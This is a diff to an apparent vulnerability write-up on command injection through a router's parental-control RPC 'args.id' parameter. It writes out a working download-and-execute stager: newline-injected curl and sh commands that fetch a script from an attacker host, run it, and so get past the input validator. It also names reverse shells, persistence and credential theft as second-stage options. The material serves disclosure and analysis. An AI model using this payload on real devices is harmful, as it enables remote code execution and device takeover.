@@ -29,14 +29,14 @@ A reliable exploitation strategy is to use a **download-and-execute stager**. Be
 A representative malicious `args.id` value is:
 
 ```
-\n/usr/bin/curl http://192.168.0.2:8000/rs.sh -o /tmp/rs\n/bin/sh /tmp/rs\n#
+"\n/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs\n/bin/sh /tmp/rs\n#"
 ```
 
 This payload contains only characters accepted by the default validator: letters, digits, slashes, dots, colons, spaces, hyphens, newlines, and `#`. After concatenation, the resulting shell execution is effectively equivalent to:
 
 ```
 rm -rf /etc/parental_control/gl-
-/usr/bin/curl http://192.168.0.2:8000/rs.sh -o /tmp/rs
+/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs
 /bin/sh /tmp/rs
 #
 ```
@@ -45,12 +45,12 @@ The second sink similarly becomes:
 
 ```
 rm -rf /tmp/pc_check_
-/usr/bin/curl http://192.168.0.2:8000/rs.sh -o /tmp/rs
+/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs
 /bin/sh /tmp/rs
 #*
 ```
 
-As a result, the device connects back to the attacker-controlled HTTP server at `192.168.0.2:8000`, downloads the second-stage script `rs.sh` into `/tmp/rs`, and executes it locally with `/bin/sh`. Since the contents of `rs.sh` are no longer subject to RPC parameter validation, the second-stage script may contain any shell syntax or logic, including reverse shells, persistence mechanisms, file exfiltration, credential harvesting, or arbitrary system command execution.
+As a result, the device connects back to the attacker-controlled HTTP server at `192.168.0.2`, downloads the second-stage script `rs.sh` into `/tmp/rs`, and executes it locally with `/bin/sh`. Since the contents of `rs.sh` are no longer subject to RPC parameter validation, the second-stage script may contain any shell syntax or logic, including reverse shells, persistence mechanisms, file exfiltration, credential harvesting, or arbitrary system command execution.
 
 This makes the vulnerability significantly more practical to exploit. Even though the first-stage injected payload is limited by the validator, the attacker can use it to bootstrap unrestricted code execution through a remote script. In practice, the second-stage script may, for example, establish a reverse shell, copy sensitive files into a web-accessible directory, modify startup scripts for persistence, or alter device configuration.
 
